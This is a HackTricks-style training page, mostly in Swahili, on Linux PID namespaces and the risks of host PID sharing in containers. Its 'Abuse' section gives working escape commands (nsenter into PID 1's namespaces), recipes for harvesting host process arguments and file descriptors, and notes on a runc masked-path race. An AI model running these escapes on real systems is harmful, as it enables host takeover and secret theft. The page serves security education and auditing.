# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

PID namespace inadhibiti jinsi michakato inavyopangiwa nambari na ni michakato gani inaonekana. Hii ndio sababu container inaweza kuwa na PID 1 yake hata ingawa sio mashine halisi. Ndani ya namespace, workload inaona kile kinachoonekana kama mti wa michakato wa ndani. Nje ya namespace, host bado inaona PIDs halisi za host na mandhari kamili ya michakato.

Kutoka kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu kuonekana kwa michakato kuna thamani. Mara workload ikiona michakato ya host, inaweza kuweza kuona majina ya huduma, vigezo vya command-line, siri zilizopitishwa katika vigezo vya mchakato, hali inayotokana na mazingira kupitia `/proc`, na malengo ya kuingia kwenye namespace. Ikiwa inaweza kufanya zaidi ya kuziwona michakato hiyo, kwa mfano kwa kutuma signals au kutumia ptrace chini ya masharti sahihi, tatizo linakuwa baya zaidi.

## Uendeshaji

PID namespace mpya inaanza na upangaji wake wa ndani wa nambari za michakato. Mchakato wa kwanza ulioundwa ndani yake unakuwa PID 1 kwa mtazamo wa namespace, jambo ambalo pia linamaanisha unapata semantiki maalum kama init kwa watoto waliotengwa na tabia za signals. Hii inaelezea mengi ya ajabu kuhusu container zinazohusiana na mchakato wa init, zombie reaping, na kwanini tiny init wrappers wakati mwingine hutumika katika container.

Somo muhimu la usalama ni kwamba mchakato unaweza kuonekana umejitenga kwa sababu unaona tu mti wake wa PID, lakini ukojeteaji huo unaweza kuondolewa kwa makusudi. Docker huonyesha hili kupitia `--pid=host`, wakati Kubernetes inafanya hivyo kupitia `hostPID: true`. Mara container itakapojiunga na host PID namespace, workload inaona michakato ya host moja kwa moja, na njia nyingi za mashambulizi za baadaye zinakuwa uwezekano mkubwa wa kutekelezeka.

## Maabara

Kuunda PID namespace kwa mikono:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Shell sasa inaona mtazamo wa mchakato wa kibinafsi. Bendera `--mount-proc` ni muhimu kwa sababu inam-mount mfano wa procfs unaolingana na namespace mpya ya PID, na hivyo kufanya orodha ya michakato kuwa thabiti kutoka ndani.

Ili kulinganisha tabia ya container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Tofauti ni ya haraka na rahisi kueleweka, ndiyo sababu hii ni maabara nzuri ya kwanza kwa wasomaji.

## Runtime Usage

Container za kawaida kwenye Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Kubernetes Pods kawaida pia hupata mtazamo wa PID uliotengwa isipokuwa workload ikaomba waziwazi host PID sharing. Mazingira ya LXC/Incus yanategemea primitive ya kernel ile ile, ingawa matumizi ya system-container yanaweza kuonyesha miti ya mchakato yenye mchanganyiko zaidi na kuhimiza njia fupi za debugging.

The same rule applies everywhere: if the runtime chose not to isolate the PID namespace, that is a deliberate reduction in the container boundary.

## Misconfigurations

The canonical misconfiguration is host PID sharing. Teams often justify it for debugging, monitoring, or service-management convenience, but it should always be treated as a meaningful security exception. Even if the container has no immediate write primitive over host processes, visibility alone can reveal a lot about the system. Once capabilities such as `CAP_SYS_PTRACE` or useful procfs access are added, the risk expands significantly.

Another mistake is assuming that because the workload cannot kill or ptrace host processes by default, host PID sharing is therefore harmless. That conclusion ignores the value of enumeration, the availability of namespace-entry targets, and the way PID visibility combines with other weakened controls.

## Abuse

If the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting services, locate candidate PIDs for `nsenter`, or combine process visibility with ptrace-related privilege to interfere with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the rest of the attack plan.

The first practical step is always to confirm that host processes are really visible:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Mara tu host PIDs zinapoonekana, process arguments na namespace-entry targets mara nyingi zinakuwa chanzo muhimu zaidi cha taarifa:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Ikiwa `nsenter` inapatikana na ruhusa za kutosha zipo, jaribu kama mchakato wa host unaoonekana unaweza kutumika kama daraja la namespace:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Hata pale kuingia kunapozuiwa, kushirikishwa kwa host PID tayari ni muhimu kwa sababu kunaonyesha mpangilio wa huduma, vipengele vya runtime, na michakato inayoweza kuwa na vibali ambayo inaweza kulengwa ifuatayo.

Uonekano wa host PID pia hufanya utumiaji vibaya wa file-descriptor kuwa wa kweli zaidi. Ikiwa mchakato wa host mwenye vibali au workload ya jirani ina faili nyeti au socket iliyo wazi, mshambuliaji anaweza kuwa na uwezo wa kuchunguza `/proc/<pid>/fd/` na kutumia tena handle hiyo kulingana na umiliki, procfs mount options, na modeli ya huduma ya lengo.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Amri hizi ni muhimu kwa sababu zinaonyesha ikiwa `hidepid=1` au `hidepid=2` zinapunguza uonekano kati ya michakato, na pia ikiwa vielelezo vinavyovutia waziwazi kama faili za siri zilizo wazi, logs, au Unix sockets vinaonekana kwa kiasi chochote.

### Mfano Kamili: host PID + `nsenter`

Kushiriki host PID kunakuwa host escape moja kwa moja wakati mchakato pia una vibali vya kutosha kujiunga na host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ikiwa amri itafanikiwa, mchakato wa container sasa unafanya kazi katika host mount, UTS, network, IPC, na PID namespaces. Athari yake ni udukuzi wa host mara moja.

Hata pale `nsenter` ikikosekana, matokeo sawa yanaweza kupatikana kupitia binary ya host ikiwa filesystem ya host imepachikwa:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Vidokezo vya hivi karibuni vya runtime

Baadhi ya mashambulizi yanayohusiana na PID-namespace siyo upotoshaji wa kawaida wa `hostPID: true`, bali ni mdudu wa utekelezaji wakati wa runtime kuhusu jinsi kinga za procfs zinavyotumika wakati wa kusanidi container.

#### `maskedPaths` race to host procfs

Katika matoleo ya `runc` yaliyo dhaifu, washambuliaji wanaoweza kudhibiti image ya container au mzigo wa `runc exec` wanaweza kushindana na hatua ya masking kwa kubadilisha upande wa container wa `/dev/null` kuwa symlink kuelekea njia nyeti ya procfs kama `/proc/sys/kernel/core_pattern`. Ikiwa mbio zingefanikiwa, bind mount ya masked-path ingeweza kuingia kwenye lengo lisilo sahihi na kufichua vidhibiti vya procfs vya host kwa container mpya.

Amri muhimu ya ukaguzi:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Hii ni muhimu kwa sababu athari yake ya mwisho inaweza kuwa sawa na mfichuko wa procfs wa moja kwa moja: writable `core_pattern` au `sysrq-trigger`, ikifuatiwa na host code execution au denial of service.

#### Namespace injection with `insject`

Zana za namespace injection kama `insject` zinaonyesha kwamba mwingiliano wa PID-namespace hauhitaji kila mara kuingia mapema kwenye namespace lengwa kabla ya kuanzisha process. Msaidizi anaweza kuambatisha baadaye, kutumia `setns()`, na kutekeleza huku akiendelea kuhifadhi uonekano wa target PID space:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Aina hii ya mbinu ni muhimu hasa kwa debugging ya hali ya juu, offensive tooling, na workflows za post-exploitation ambapo muktadha wa namespace lazima uunganishwe baada ya runtime tayari kuanzisha workload.

### Mifumo ya Unyonyaji wa FD Yanayohusiana

Mifumo miwili inafaa kutajwa wazi wakati host PIDs zinapoonekana. Kwanza, process yenye ruhusa inaweza kuacha file descriptor nyeti wazi kwa kipindi cha `execve()` kwa sababu haikuwekwa `O_CLOEXEC`. Pili, services zinaweza kupitisha file descriptors kupitia Unix sockets kwa `SCM_RIGHTS`. Katika pande zote mbili, kitu kinachovutia si tena pathname, bali handle iliyoshafunguliwa ambayo process yenye ruhusa ndogo inaweza kurithi au kupokea.

Hili ni muhimu katika kazi za container kwa sababu handle inaweza kuelekeza kwa `docker.sock`, log yenye ruhusa, faili la siri la host, au kitu kingine cha thamani hata wakati njia yenyewe haiwezi kufikiwa moja kwa moja kutoka kwenye filesystem ya container.

## Ukaguzi

Madhumuni ya amri hizi ni kubaini kama mchakato una mtazamo wa PID wa kibinafsi au kama mchakato tayari unaweza kuorodhesha mazingira mpana zaidi ya michakato.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
- Ikiwa orodha ya mchakato ina huduma za mwenyeji zinazoonekana wazi, ugawaji wa PID za mwenyeji kuna uwezekano tayari unatumika.
- Kuona mti mdogo wa ndani ya container pekee ndilo msingi wa kawaida; kuona `systemd`, `dockerd`, au daemons zisizohusiana si kawaida.
- Mara PID za mwenyeji zinapokuonekana, hata taarifa za mchakato za kusoma tu zinakuwa upelelezi muhimu.

Ikiwa ugundua container inayoendesha ikiwa na ugawaji wa PID wa mwenyeji, usiichukulie kama tofauti ya mapambo pekee. Ni mabadiliko makubwa katika kile mzigo wa kazi kinaweza kukiona na kuathiri kwa uwezekano.
